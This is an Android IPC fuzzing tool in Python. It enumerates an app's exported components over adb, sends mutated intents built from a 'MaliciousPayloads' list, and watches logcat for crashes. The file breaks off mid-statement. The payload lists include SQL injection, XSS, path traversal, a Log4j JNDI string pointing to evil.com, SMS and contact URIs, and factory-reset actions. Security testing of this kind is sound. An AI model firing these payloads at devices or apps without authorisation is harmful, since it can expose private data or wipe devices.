"""
Android Intent Fuzzer Service

Fuzzes Android application IPC mechanisms via malformed Intents:
1. Activity fuzzing - Start activities with malicious intents
2. Service fuzzing - Bind/start services with crafted data
3. Broadcast receiver fuzzing - Send malicious broadcasts
4. Content provider fuzzing - Query/insert with malicious URIs
"""

import asyncio
import hashlib
import json
import logging
import random
import re
import string
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, AsyncGenerator, Dict, List, Optional, Set, Tuple

logger = logging.getLogger(__name__)


# ============================================================================
# Enums
# ============================================================================

class ComponentType(Enum):
    """Android component types."""
    ACTIVITY = "activity"
    SERVICE = "service"
    RECEIVER = "receiver"
    PROVIDER = "provider"


class IntentFlag(Enum):
    """Common Intent flags."""
    FLAG_ACTIVITY_NEW_TASK = 0x10000000
    FLAG_ACTIVITY_CLEAR_TOP = 0x04000000
    FLAG_ACTIVITY_SINGLE_TOP = 0x20000000
    FLAG_ACTIVITY_NO_HISTORY = 0x40000000
    FLAG_GRANT_READ_URI_PERMISSION = 0x00000001
    FLAG_GRANT_WRITE_URI_PERMISSION = 0x00000002
    FLAG_INCLUDE_STOPPED_PACKAGES = 0x00000020
    FLAG_RECEIVER_FOREGROUND = 0x10000000


class CrashType(Enum):
    """Type of crash or issue detected."""
    JAVA_EXCEPTION = "java_exception"
    NATIVE_CRASH = "native_crash"
    ANR = "anr"
    SECURITY_EXCEPTION = "security_exception"
    NULL_POINTER = "null_pointer"
    ILLEGAL_ARGUMENT = "illegal_argument"
    ILLEGAL_STATE = "illegal_state"
    CLASS_CAST = "class_cast"
    OUT_OF_MEMORY = "out_of_memory"
    FILE_NOT_FOUND = "file_not_found"
    PERMISSION_DENIAL = "permission_denial"
    UNKNOWN = "unknown"


class Severity(Enum):
    """Issue severity."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


# ============================================================================
# Data Classes
# ============================================================================

@dataclass
class IntentFilter:
    """Represents an intent filter."""
    actions: List[str] = field(default_factory=list)
    categories: List[str] = field(default_factory=list)
    data_schemes: List[str] = field(default_factory=list)
    data_hosts: List[str] = field(default_factory=list)
    data_paths: List[str] = field(default_factory=list)
    data_mime_types: List[str] = field(default_factory=list)
    priority: int = 0


@dataclass
class ExportedComponent:
    """Information about an exported Android component."""
    name: str
    component_type: ComponentType
    package_name: str
    intent_filters: List[IntentFilter] = field(default_factory=list)
    permissions: List[str] = field(default_factory=list)
    exported: bool = True
    enabled: bool = True
    process: str = ""
    description: str = ""


@dataclass
class IntentTemplate:
    """Template for generating intents."""
    action: Optional[str] = None
    categories: List[str] = field(default_factory=list)
    data_uri: Optional[str] = None
    mime_type: Optional[str] = None
    extras: Dict[str, Any] = field(default_factory=dict)
    flags: int = 0
    component: Optional[str] = None  # package/class
    package: Optional[str] = None    # Target package


@dataclass
class IntentFuzzConfig:
    """Configuration for intent fuzzing."""
    device_serial: str
    package_name: str
    target_component: Optional[str] = None  # Specific or all

    # Component types to fuzz
    fuzz_activities: bool = True
    fuzz_services: bool = True
    fuzz_receivers: bool = True
    fuzz_providers: bool = True

    # Mutation options
    fuzz_extras: bool = True
    fuzz_uri: bool = True
    fuzz_mime: bool = True
    fuzz_action: bool = True
    fuzz_flags: bool = True
    mutation_rate: float = 0.3

    # Limits
    max_iterations: int = 1000
    max_crashes: int = 50
    timeout_ms: int = 5000
    delay_between_ms: int = 100

    # Monitoring
    monitor_logcat: bool = True
    monitor_anr: bool = True
    capture_screenshots: bool = False


@dataclass
class IntentCrash:
    """Information about a crash caused by an intent."""
    crash_id: str
    crash_type: CrashType
    severity: Severity
    component: str
    component_type: ComponentType
    exception_class: str = ""
    exception_message: str = ""
    stack_trace: str = ""
    intent_template: Optional[IntentTemplate] = None
    intent_command: str = ""
    is_unique: bool = True
    timestamp: datetime = field(default_factory=datetime.now)
    logcat_snippet: str = ""
    details: Dict[str, Any] = field(default_factory=dict)


@dataclass
class FuzzStats:
    """Statistics for intent fuzzing."""
    intents_sent: int = 0
    crashes: int = 0
    unique_crashes: int = 0
    anrs: int = 0
    security_exceptions: int = 0
    components_tested: int = 0
    start_time: Optional[datetime] = None


@dataclass
class IntentFuzzResult:
    """Result of an intent fuzzing session."""
    session_id: str
    package_name: str
    status: str  # running, completed, error
    stats: FuzzStats = field(default_factory=FuzzStats)
    crashes: List[IntentCrash] = field(default_factory=list)
    components_tested: List[str] = field(default_factory=list)
    duration_sec: float = 0.0
    error_message: Optional[str] = None


# ============================================================================
# Malicious Payload Generators
# ============================================================================

class MaliciousPayloads:
    """
    Collection of malicious payloads for fuzzing Android IPC.
    These are common attack patterns used in Android security testing.
    """

    # String payloads
    STRINGS = [
        "",                                     # Empty
        " " * 1000,                             # Long whitespace
        "A" * 10000,                            # Long string (buffer overflow)
        "A" * 100000,                           # Very long string
        "\x00" * 100,                           # NULL bytes
        "\n" * 1000,                            # Newlines
        "\r\n" * 500,                           # CRLF injection
        "%n%n%n%n%n%n%n%n",                     # Format string
        "%s%s%s%s%s%s%s%s",                     # Format string
        "%x%x%x%x%x%x%x%x",                     # Format string
        "../../../etc/passwd",                  # Path traversal
        "..\\..\\..\\..\\windows\\system32",   # Windows path traversal
        "file:///etc/passwd",                   # File URI
        "file:///data/data/com.target/databases/secret.db",
        "content://settings/system",            # Settings provider
        "'; DROP TABLE users; --",              # SQL injection
        "' OR '1'='1",                          # SQL injection
        "1 OR 1=1--",                           # SQL injection
        "<script>alert(1)</script>",            # XSS
        "<img src=x onerror=alert(1)>",         # XSS
        "javascript:alert(1)",                  # JavaScript URI
        "${7*7}",                               # Template injection
        "{{7*7}}",                              # Template injection
        "${jndi:ldap://evil.com/a}",           # Log4j
        "\\x00\\x01\\x02\\x03",                # Binary data
        "\ud800\udfff",                         # Invalid Unicode surrogates
        "🔥" * 1000,                            # Emoji spam
    ]

    # Integer payloads
    INTEGERS = [
        0,
        -1,
        1,
        127,                    # Max signed byte
        128,                    # Min unsigned byte overflow
        255,                    # Max unsigned byte
        256,                    # Byte overflow
        32767,                  # Max signed short
        32768,                  # Short overflow
        65535,                  # Max unsigned short
        65536,                  # Short overflow
        2147483647,             # Max int32
        2147483648,             # Int32 overflow
        -2147483648,            # Min int32
        -2147483649,            # Int32 underflow
        4294967295,             # Max uint32
        4294967296,             # Uint32 overflow
        9223372036854775807,    # Max int64
        -9223372036854775808,   # Min int64
        0x7FFFFFFF,
        0x80000000,
        0xFFFFFFFF,
        0xDEADBEEF,
        0xCAFEBABE,
    ]

    # Float payloads
    FLOATS = [
        0.0,
        -0.0,
        1.0,
        -1.0,
        float('inf'),
        float('-inf'),
        float('nan'),
        1e308,                  # Near max double
        1e-308,                 # Near min double
        1.7976931348623157e+308,  # Max double
        2.2250738585072014e-308,  # Min positive double
    ]

    # URI payloads
    URIS = [
        "",
        "://",
        "file:///",
        "file:///etc/passwd",
        "file:///data/data/com.android.providers.settings/databases/settings.db",
        "file:///proc/self/maps",
        "file:///proc/self/cmdline",
        "content://",
        "content://com.android.contacts/contacts",
        "content://sms/inbox",
        "content://call_log/calls",
        "content://media/external/images/media",
        "content://com.android.externalstorage.documents/root/primary",
        "content://settings/system",
        "content://settings/secure",
        "content://settings/global",
        "android.resource://com.android.settings/raw/config",
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://169.254.169.254",   # AWS metadata
        "http://metadata.google.internal",  # GCP metadata
        "javascript:alert(1)",
        "intent://",
        "intent:#Intent;",
        "market://details?id=com.malware",
        "tel:*#*#4636#*#*",        # Hidden menu code
        "geo:0,0?q=",
    ]

    # Action payloads (for fuzzing action field)
    ACTIONS = [
        "",
        "android.intent.action.MAIN",
        "android.intent.action.VIEW",
        "android.intent.action.SEND",
        "android.intent.action.SENDTO",
        "android.intent.action.CALL",
        "android.intent.action.DIAL",
        "android.intent.action.DELETE",
        "android.intent.action.INSTALL_PACKAGE",
        "android.intent.action.UNINSTALL_PACKAGE",
        "android.intent.action.FACTORY_RESET",
        "android.intent.action.MASTER_CLEAR",
        "android.intent.action.REBOOT",
        "android.intent.action.SHUTDOWN",
        "android.settings.SETTINGS",
        "android.settings.WIFI_SETTINGS",
        "android.settings.BLUETOOTH_SETTINGS",
        "android.settings.LOCATION_SOURCE_SETTINGS",
        "android.provider.Telephony.SMS_RECEIVED",
        "android.provider.Telephony.WAP_PUSH_RECEIVED",
        "android.intent.action.BOOT_COMPLETED",
        "android.intent.action.PACKAGE_ADDED",
        "android.intent.action.PACKAGE_REMOVED",
        "com.google.android.c2dm.intent.RECEIVE",  # FCM
        # Malformed
        "A" * 1000,
        "../../../",
    ]

    # MIME type payloads
    MIME_TYPES = [
        "",
        "*/*",
        "text/plain",
        "text/html",
        "application/json",
        "application/xml",
        "application/javascript",
        "application/x-www-form-urlencoded",
        "image/png",
        "image/jpeg",
        "video/mp4",
        "audio/mpeg",
        "application/octet-stream",
        "application/vnd.android.package-archive",
        # Malformed
        "../../../etc/passwd",
        "text/plain; charset=utf-8; boundary=A" * 100,
    ]

    # Extra key names to try
    EXTRA_KEYS = [
        "android.intent.extra.TEXT",
        "android.intent.extra.SUBJECT",
        "android.intent.extra.EMAIL",
        "android.intent.extra.STREAM",
        "android.intent.extra.UID",
        "android.intent.extra.PACKAGE_NAME",
        "android.intent.extra.COMPONENT_NAME",
        "android.intent.extra.INTENT",
        "android.intent.extra.KEY_EVENT",
        "android.intent.extra.user",
        "android.intent.extra.USER_ID",
        "url",
        "uri",
        "path",
        "file",
        "data",
        "json",
        "xml",
        "token",
        "password",
        "secret",
        "api_key",
        "command",
        "query",
        "id",
        "user_id",
        "callback",
        "redirect",
        # App-specific common keys
        "extra_data",
        "payload",
        "request",
        "response",
    ]

    @classmethod
    def generate_malicious_extras(cls, count: int = 5) -> Dict[str, Any]:
        """Generate a dictionary of malicious extras."""
        extras = {}

        for _ in range(count):
            key = random.choice(cls.EXTRA_KEYS)

            # Random type selection
            value_type = random.choice(["string", "int", "float", "uri", "nested"])

            if value_type == "string":
                extras[key] = random.choice(cls.STRINGS)
            elif value_type == "int":
                extras[key] = random.choice(cls.INTEGERS)
            elif value_type == "float":
                extras[key] = random.choice(cls.FLOATS)
            elif value_type == "uri":
                extras[key] = random.choice(cls.URIS)
            elif value_type == "nested":
                # Nested bundle with more malicious data
                extras[key] = {
                    "nested_" + k: random.choice(cls.STRINGS)
                    for k in random.sample(cls.EXTRA_KEYS, min(3, len(cls.EXTRA_KEYS)))
                }

        return extras

    @classmethod
    def generate_malicious_uri(cls) -> str:
        """Generate a malicious URI."""
        return random.choice(cls.URIS)

    @classmethod
    def generate_malicious_string(cls) -> str:
        """Generate a malicious string."""
        return random.choice(cls.STRINGS)


# ============================================================================
# Android Intent Fuzzer Service
# ============================================================================

class AndroidIntentFuzzer:
    """
    Fuzz Android application IPC via malformed Intents.

    Tests:
    - Activities: Start with malicious intents
    - Services: Bind/start with crafted data
    - Broadcast Receivers: Send malicious broadcasts
    - Content Providers: Query/insert with malicious URIs

    Monitors for crashes, ANRs, and security exceptions.
    """

    def __init__(self):
        self.device_service = None  # Injected
        self.sessions: Dict[str, IntentFuzzResult] = {}
        self._crash_hashes: Dict[str, Set[str]] = {}
        self._logcat_tasks: Dict[str, asyncio.Task] = {}

    def set_device_service(self, device_service):
        """Inject the device service dependency."""
        self.device_service = device_service

    # ========================================================================
    # Component Discovery
    # ========================================================================

    async def get_exported_components(
        self,
        serial: str,
        package: str
    ) -> List[ExportedComponent]:
        """
        Get all exported components from a package.
        Uses dumpsys to extract component information.
        """
        if not self.device_service:
            raise RuntimeError("Device service not configured")

        components = []

        # Get package info with full details
        result = await self.device_service.shell(
            serial,
            f"dumpsys package {package}"
        )

        if result.exit_code != 0:
            logger.warning(f"Failed to get package info: {result.stderr}")
            return []

        output = result.stdout

        # Parse activities
        activities = self._parse_components(output, "Activity Resolver Table:", package)
        for act in activities:
            act.component_type = ComponentType.ACTIVITY
        components.extend(activities)

        # Parse services
        services = self._parse_components(output, "Service Resolver Table:", package)
        for svc in services:
            svc.component_type = ComponentType.SERVICE
        components.extend(services)

        # Parse receivers
        receivers = self._parse_components(output, "Receiver Resolver Table:", package)
        for rcv in receivers:
            rcv.component_type = ComponentType.RECEIVER
        components.extend(receivers)

        # Parse providers
        providers = self._parse_providers(output, package)
        components.extend(providers)

        # Alternative: use pm dump for more accurate export status
        pm_result = await self.device_service.shell(
            serial,
            f"pm dump {package} | grep -A2 'exported='"
        )

        # Filter to only exported components
        exported = [c for c in components if c.exported]

        logger.info(f"Found {len(exported)} exported components in {package}")
        return exported

    def _parse_components(
        self,
        dumpsys_output: str,
        section_marker: str,
        package: str
    ) -> List[ExportedComponent]:
        """Parse components from dumpsys output."""
        components = []

        # Find section
        section_start = dumpsys_output.find(section_marker)
        if section_start == -1:
            return []

        # Get section text (until next section or end)
        section_end = dumpsys_output.find("Resolver Table:", section_start + len(section_marker))
        if section_end == -1:
            section_end = len(dumpsys_output)

        section = dumpsys_output[section_start:section_end]

        # Parse entries
        current_component = None
        current_filter = None

        for line in section.split('\n'):
            line = line.strip()

            # Component line: starts with package name
            if line.startswith(f"{package}/"):
                comp_name = line.split()[0]
                current_component = ExportedComponent(
                    name=comp_name,
                    component_type=ComponentType.ACTIVITY,  # Will be overridden
                    package_name=package,
                    exported=True  # If in resolver table, likely exported
                )
                components.append(current_component)
                current_filter = None

            # Intent filter
            elif "Action:" in line and current_component:
                action = line.replace("Action:", "").strip().strip('"')
                if current_filter is None:
                    current_filter = IntentFilter()
                    current_component.intent_filters.append(current_filter)
                current_filter.actions.append(action)

            elif "Category:" in line and current_filter:
                category = line.replace("Category:", "").strip().strip('"')
                current_filter.categories.append(category)

            elif "Scheme:" in line and current_filter:
                scheme = line.replace("Scheme:", "").strip().strip('"')
                current_filter.data_schemes.append(scheme)

            elif "Type:" in line and current_filter:
                mime = line.replace("Type:", "").strip().strip('"')
                current_filter.data_mime_types.append(mime)

        return components

    def _parse_providers(
        self,
        dumpsys_output: str,
        package: str
    ) -> List[ExportedComponent]:
        """Parse content providers from dumpsys output."""
        components = []

        # Look for ContentProviders section
        provider_section = re.search(
            r'ContentProviders:.*?(?=\n\s*\n|\Z)',
            dumpsys_output,
            re.DOTALL
        )

        if not provider_section:
            return []

        section = provider_section.group(0)

        # Find providers for this package
        # Format: Provider{hash name/authority}
        provider_pattern = re.compile(
            rf'Provider\{{[a-f0-9]+ ({package}/[^\s}}]+)\}}'
        )

        for match in provider_pattern.finditer(section):
            comp_name = match.group(1)
            components.append(ExportedComponent(
                name=comp_name,
                component_type=ComponentType.PROVIDER,
                package_name=package,
                exported=True  # Will need to verify
            ))

        return components

    async def get_intent_filters(
        self,
        serial: str,
        package: str,
        component: str
    ) -> List[IntentFilter]:
        """Get intent filters for a specific component."""
        result = await self.device_service.shell(
            serial,
            f"dumpsys package {package} | grep -A20 '{component}'"
        )

        if result.exit_code != 0:
            return []

        filters = []
        current_filter = None

        for line in result.stdout.split('\n'):
            line = line.strip()

            if "filter" in line.lower():
                current_filter = IntentFilter()
                filters.append(current_filter)

            elif current_filter:
                if "Action:" in line:
                    action = line.split(":", 1)[-1].strip().strip('"')
                    current_filter.actions.append(action)
                elif "Category:" in line:
                    cat = line.split(":", 1)[-1].strip().strip('"')
                    current_filter.categories.append(cat)

        return filters

    # ========================================================================
    # Intent Generation and Mutation
    # ========================================================================

    def generate_intent(
        self,
        component: ExportedComponent,
        base_intent: Optional[IntentTemplate] = None
    ) -> IntentTemplate:
        """Generate an intent for a component based on its filters."""
        intent = base_intent or IntentTemplate()

        # Set target component
        intent.component = component.name

        # Use first available action from filters
        if component.intent_filters:
            filter_0 = component.intent_filters[0]
            if filter_0.actions:
                intent.action = filter_0.actions[0]
            if filter_0.categories:
                intent.categories = filter_0.categories.copy()
            if filter_0.data_schemes:
                intent.data_uri = f"{filter_0.data_schemes[0]}://example.com/test"
            if filter_0.data_mime_types:
                intent.mime_type = filter_0.data_mime_types[0]

        # Set appropriate flags
        if component.component_type == ComponentType.ACTIVITY:
            intent.flags = IntentFlag.FLAG_ACTIVITY_NEW_TASK.value

        return intent

    def mutate_intent(
        self,
        intent: IntentTemplate,
        config: IntentFuzzConfig
    ) -> IntentTemplate:
        """Apply mutations to an intent template."""
        mutated = IntentTemplate(
            action=intent.action,
            categories=intent.categories.copy(),
            data_uri=intent.data_uri,
            mime_type=intent.mime_type,
            extras=intent.extras.copy(),
            flags=intent.flags,
            component=intent.component,
            package=intent.package
        )

        # Apply mutations based on config
        if config.fuzz_action and random.random() < config.mutation_rate:
            mutated.action = random.choice(MaliciousPayloads.ACTIONS)

        if config.fuzz_uri and random.random() < config.mutation_rate:
            mutated.data_uri = MaliciousPayloads.generate_malicious_uri()

        if config.fuzz_mime and random.random() < config.mutation_rate:
            mutated.mime_type = random.choice(MaliciousPayloads.MIME_TYPES)

        if config.fuzz_extras and random.random() < config.mutation_rate:
            # Add malicious extras
            malicious_extras = MaliciousPayloads.generate_malicious_extras(
                random.randint(1, 5)
            )
            mutated.extras.update(malicious_extras)

        if config.fuzz_flags and random.random() < config.mutation_rate:
            # Add random flags
            flag_list = list(IntentFlag)
            selected_flags = random.sample(flag_list, random.randint(1, 3))
            for flag in selected_flags:
                mutated.flags |= flag.value

        return mutated

    def intent_to_adb_command(
        self,
        intent: IntentTemplate,
        component_type: ComponentType
    ) -> str:
        """Convert an intent template to an ADB am command."""
        # Base command depends on component type
        if component_type == ComponentType.ACTIVITY:
            cmd = "am start"
        elif component_type == ComponentType.SERVICE:
            cmd = "am startservice"
        elif component_type == ComponentType.RECEIVER:
            cmd = "am broadcast"
        else:
            cmd = "am start"  # Default

        parts = [cmd]

        # Add action
        if intent.action:
            # Escape special characters for shell
            action = self._shell_escape(intent.action)
            parts.append(f"-a '{action}'")

        # Add categories
        for category in intent.categories:
            cat = self._shell_escape(category)
            parts.append(f"-c '{cat}'")

        # Add data URI
        if intent.data_uri:
            uri = self._shell_escape(intent.data_uri)
            parts.append(f"-d '{uri}'")

        # Add MIME type
        if intent.mime_type:
            mime = self._shell_escape(intent.mime_type)
            parts.append(f"-t '{mime}'")

        # Add component
        if intent.component:
            parts.append(f"-n '{intent.component}'")

        # Add package
        if intent.package:
            parts.append(f"-p '{intent.package}'")

        # Add flags
        if intent.flags:
            parts.append(f"-f {intent.flags}")

        # Add extras
        for key, value in intent.extras.items():
            key_escaped = self._shell_escape(key)

            if isinstance(value, str):
                val_escaped = self._shell_escape(value)
                parts.append(f"--es '{key_escaped}' '{val_escaped}'")
            elif isinstance(value, bool):
                parts.append(f"--ez '{key_escaped}' {str(value).lower()}")
            elif isinstance(value, int):
                parts.append(f"--ei '{key_escaped}' {value}")
            elif isinstance(value, float):
                parts.append(f"--ef '{key_escaped}' {value}")
            elif isinstance(value, dict):
                # Serialize as JSON string
                json_val = self._shell_escape(json.dumps(value))
                parts.append(f"--es '{key_escaped}' '{json_val}'")

        return " ".join(parts)

    def _shell_escape(self, s: str) -> str:
        """Escape a string for shell usage."""
        if not s:
            return ""
        # Replace single quotes and escape special chars
        return s.replace("'", "'\\''").replace("$", "\\$").replace("`", "\\`")

    # ========================================================================
    # Intent Sending
    # ========================================================================

    async def send_intent(
        self,
        serial: str,
        intent: IntentTemplate,
        component_type: ComponentType,
        timeout_ms: int = 5000
    ) -> Dict[str, Any]:
        """Send an intent to the device."""
        if not self.device_service:
            raise RuntimeError("Device service not configured")

        cmd = self.intent_to_adb_command(intent, component_type)

        start_time = time.time()
        result = await self.device_service.shell(serial, cmd)
        elapsed_ms = (time.time() - start_time) * 1000

        return {
            "success": result.exit_code == 0,
            "stdout": result.stdout,
            "stderr": result.stderr,
            "exit_code": result.exit_code,
            "elapsed_ms": elapsed_ms,
            "command": cmd
        }

    async def start_activity(
        self,
        serial: str,
        intent: IntentTemplate
    ) -> Dict[str, Any]:
        """Start an activity with the given intent."""
        # Ensure NEW_TASK flag for starting from shell
        intent.flags |= IntentFlag.FLAG_ACTIVITY_NEW_TASK.value
        return await self.send_intent(serial, intent, ComponentType.ACTIVITY)

    async def start_service(
        self,
        serial: str,
        intent: IntentTemplate
    ) -> Dict[str, Any]:
        """Start a service with the given intent."""
        return await self.send_intent(serial, intent, ComponentType.SERVICE)

    async def send_broadcast(
        self,
        serial: str,
        intent: IntentTemplate
    ) -> Dict[str, Any]:
        """Send a broadcast with the given intent."""
        return await self.send_intent(serial, intent, ComponentType.RECEIVER)

    async def query_provider(
        self,
        serial: str,
        uri: str,
        projection: Optional[List[str]] = None,
        selection: Optional[str] = None
    ) -> Dict[str, Any]:
        """Query a content provider."""
        if not self.device_service:
            raise RuntimeError("Device service not configured")

        cmd = f"content query --uri '{self._shell_escape(uri)}'"

        if projection:
            cols = ",".join(projection)
            cmd += f" --projection '{cols}'"

        if selection:
            sel = self._shell_escape(selection)
            cmd += f" --where '{sel}'"

        result = await self.device_service.shell(serial, cmd)

        return {
            "success": result.exit_code == 0,
            "rows": result.stdout.count("Row:"),
            "output": result.stdout[:2000],  # Truncate
            "error": result.stderr
        }

    # ========================================================================
    # Fuzzing Campaigns
    # ========================================================================

    async def fuzz_component(
        self,
        config: IntentFuzzConfig,
        component: ExportedComponent
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """Fuzz a single component."""
        session_id = str(uuid.uuid4())[:8]

        yield {
            "type": "component_start",
            "component": component.name,
            "component_type": component.component_type.value
        }

        # Generate base intent
        base_intent = self.generate_intent(component)
        crash_count = 0

        for i in range(config.max_iterations):
            # Mutate intent
            mutated = self.mutate_intent(base_intent, config)

            # Send intent
            result = await self.send_intent(
                config.device_serial,
                mutated,
                component.component_type,
                config.timeout_ms
            )

            yield {
                "type": "intent_sent",
                "iteration": i + 1,
                "component": component.name,
                "success": result["success"]
            }

            # Check for crash indicators in output
            crash = self._check_for_crash(result, mutated, component)
            if crash:
                crash_count += 1
                yield {
                    "type": "crash",
                    "crash_id": crash.crash_id,
                    "crash_type": crash.crash_type.value,
                    "severity": crash.severity.value,
                    "component": component.name,
                    "exception": crash.exception_class
                }

                if crash_count >= config.max_crashes:
                    yield {"type": "max_crashes_reached"}
                    break

            # Delay between intents
            if config.delay_between_ms > 0:
                await asyncio.sleep(config.delay_between_ms / 1000)

        yield {
            "type": "component_complete",
            "component": component.name,
            "intents_sent": min(i + 1, config.max_iterations),
            "crashes": crash_count
        }

    async def fuzz_package(
        self,
        config: IntentFuzzConfig
    ) -> AsyncGenerator[Dict[str, Any], None]:
        """Run a full fuzzing campaign against a package."""
        session_id = str(uuid.uuid4())[:8]

        result = IntentFuzzResult(
            session_id=session_id,
            package_name=config.package_name,
            status="starting"
        )
        result.stats.start_time = datetime.now()
        self.sessions[session_id] = result
        self._crash_hashes[session_id] = set()

        yield {
            "type": "session_start",
            "session_id": session_id,
            "package": config.package_name
        }

        try:
            # Discover components
            components = await self.get_exported_components(
                config.device_serial,
                config.package_name
            )

            if not components:
                yield {
                    "type": "warning",
                    "message": f"No exported components found in {config.package_name}"
                }
                result.status = "completed"
                return

            yield {
                "type": "components_discovered",
                "count": len(components),
                "activities": len([c for c in components if c.component_type == ComponentType.ACTIVITY]),
                "services": len([c for c in components if c.component_type == ComponentType.SERVICE]),
                "receivers": len([c for c in components if c.component_type == ComponentType.RECEIVER]),
                "providers": len([c for c in components if c.component_type == ComponentType.PROVIDER])
            }

            # Start logcat monitoring if enabled
            logcat_queue: asyncio.Queue = asyncio.Queue()
            logcat_task = None

            if config.monitor_logcat:
                logcat_task = asyncio.create_task(
                    self._monitor_logcat(
                        config.device_serial,
                        config.package_name,
                        logcat_queue
                    )
                )
                self._logcat_tasks[session_id] = logcat_task

            result.status = "running"

            # Filter components by config
            components_to_fuzz = []
            for comp in components:
                if config.target_component and comp.name != config.target_component:
                    continue
                if comp.component_type == ComponentType.ACTIVITY and not config.fuzz_activities:
                    continue
                if comp.component_type == ComponentType.SERVICE and not config.fuzz_services:
                    continue
                if comp.component_type == ComponentType.RECEIVER and not config.fuzz_receivers:
                    continue
                if comp.component_type == ComponentType.PROVIDER and not config.fuzz_providers:
                    continue
                components_to_fuzz.append(comp)

            yield {
                "type": "fuzzing_started",
                "components_to_fuzz": len(components_to_fuzz)
            }

            # Fuzz each component
            for component in components_to_fuzz:
                # Generate base intent
                base_intent = self.generate_intent(component)

                for i in range(config.max_iterations // len(components_to_fuzz)):
                    # Mutate intent
                    mutated = self.mutate_intent(base_intent, config)

                    # Send intent
                    send_result = await self.send_intent(
                        config.device_serial,
                        mutated,
                        component.component_type,
                        config.timeout_ms
                    )

                    result.stats.intents_sent += 1

                    # Check for crash in output
                    crash = self._check_for_crash(send_result, mutated, component)
                    if crash:
                        # Check uniqueness
                        crash_hash = f"{crash.exception_class}:{crash.component}"
                        is_unique = crash_hash not in self._crash_hashes[session_id]

                        if is_unique:
                            self._crash_hashes[session_id].add(crash_hash)
                            crash.is_unique = True
                            result.crashes.append(crash)
                            result.stats.unique_crashes += 1

                            yield {
                                "type": "crash",
                                "crash_id": crash.crash_id,
                                "crash_type": crash.crash_type.value,
                                "severity": crash.severity.value,
                                "component": component.name,
                                "exception": crash.exception_class,
                                "message": crash.exception_message[:200]
                            }

                        result.stats.crashes += 1

                    # Check logcat for crashes
                    while not logcat_queue.empty():
                        try:
                            log_crash = logcat_queue.get_nowait()
                            if log_crash:
                                result.crashes.append(log_crash)
                                result.stats.crashes += 1
                                if log_crash.crash_type == CrashType.ANR:
                                    result.stats.anrs += 1

                                yield {
                                    "type": "crash_from_logcat",
                                    "crash_type": log_crash.crash_type.value,
                                    "component": log_crash.component
                                }
                        except asyncio.QueueEmpty:
                            break

                    # Periodic stats
                    if result.stats.intents_sent % 50 == 0:
                        yield {
                            "type": "stats",
                            "intents_sent": result.stats.intents_sent,
                            "crashes": result.stats.crashes,
                            "unique_crashes": result.stats.unique_crashes,
                            "anrs": result.stats.anrs
                        }

                    # Delay
                    if config.delay_between_ms > 0:
                        await asyncio.sleep(config.delay_between_ms / 1000)

                    # Check limits
                    if result.stats.unique_crashes >= config.max_crashes:
                        logger.info("Max unique crashes reached")
                        break

                result.components_tested.append(component.name)
                result.stats.components_tested += 1

            # Stop logcat monitoring
            if logcat_task:
                logcat_task.cancel()
                try:
                    await logcat_task
                except asyncio.CancelledError:
                    pass

            result.status = "completed"
            result.duration_sec = (datetime.now() - result.stats.start_time).total_seconds()

            yield {
                "type": "session_complete",
                "session_id": session_id,
                "stats": {
                    "intents_sent": result.stats.intents_sent,
                    "crashes": result.stats.crashes,
                    "unique_crashes": result.stats.unique_crashes,
                    "anrs": result.stats.anrs,
                    "components_tested": result.stats.components_tested,
                    "duration_sec": round(result.duration_sec, 1)
                }
            }

        except Exception as e:
            result.status = "error"
            result.error_message = str(e)
            logger.exception(f"Intent fuzzing error: {e}")

            yield {
                "type": "error",
                "session_id": session_id,
                "message": str(e)
            }

    def _check_for_crash(
        self,
        send_result: Dict[str, Any],
        intent: IntentTemplate,
        component: ExportedComponent
    ) -> Optional[IntentCrash]:
        """Check send result for crash indicators."""
        output = send_result.get("stdout", "") + send_result.get("stderr", "")

        # Common exception patterns
        exception_patterns = [
            (r"java\.lang\.NullPointerException", CrashType.NULL_POINTER, Severity.MEDIUM),
            (r"java\.lang\.IllegalArgumentException:?\s*(.+)?", CrashType.ILLEGAL_ARGUMENT, Severity.MEDIUM),
            (r"java\.lang\.IllegalStateException:?\s*(.+)?", CrashType.ILLEGAL_STATE, Severity.MEDIUM),
            (r"java\.lang\.ClassCastException", CrashType.CLASS_CAST, Severity.LOW),
            (r"java\.lang\.SecurityException:?\s*(.+)?", CrashType.SECURITY_EXCEPTION, Severity.HIGH),
            (r"java\.lang\.OutOfMemoryError", CrashType.OUT_OF_MEMORY, Severity.HIGH),
            (r"java\.io\.FileNotFoundException", CrashType.FILE_NOT_FOUND, Severity.LOW),
            (r"android\.os\.DeadObjectException", CrashType.JAVA_EXCEPTION, Severity.MEDIUM),
            (r"android\.content\.ActivityNotFoundException", CrashType.JAVA_EXCEPTION, Severity.LOW),
            (r"Permission Denial", CrashType.PERMISSION_DENIAL, Severity.INFO),
            (r"Error:|Exception:|FATAL EXCEPTION", CrashType.JAVA_EXCEPTION, Severity.MEDIUM),
        ]

        for pattern, crash_type, severity in exception_patterns:
            match = re.search(pattern, output, re.IGNORECASE)
            if match:
                # Extract exception details
                exception_class = pattern.split(":")[0].replace("\\.", ".").rstrip("?")
                exception_message = match.group(1) if match.lastindex else ""

                crash_id = hashlib.md5(
                    f"{crash_type.value}:{component.name}:{exception_class}".encode()
                ).hexdigest()[:12]

                return IntentCrash(
                    crash_id=crash_id,
                    crash_type=crash_type,
                    severity=severity,
                    component=component.name,
                    component_type=component.component_type,
                    exception_class=exception_class,
                    exception_message=exception_message[:500],
                    intent_template=intent,
                    intent_command=send_result.get("command", ""),
                    logcat_snippet=output[:1000]
                )

        return None

    async def _monitor_logcat(
        self,
        serial: str,
        package: str,
        queue: asyncio.Queue
    ):
        """Monitor logcat for crashes and ANRs."""
        if not self.device_service:
            return

        try:
            async for line in self.device_service.logcat(serial, f"*:E"):
                # Check for fatal exceptions
                if "FATAL EXCEPTION" in line or "ANR in" in line:
                    crash_type = CrashType.ANR if "ANR" in line else CrashType.JAVA_EXCEPTION

                    crash = IntentCrash(
                        crash_id=hashlib.md5(line.encode()).hexdigest()[:12],
                        crash_type=crash_type,
                        severity=Severity.HIGH if crash_type == CrashType.ANR else Severity.MEDIUM,
                        component=package,
                        component_type=ComponentType.ACTIVITY,
                        logcat_snippet=line[:500]
                    )

                    await queue.put(crash)

                # Check for native crashes
                if "*** *** ***" in line or "signal" in line.lower() and "SIGSEGV" in line:
                    crash = IntentCrash(
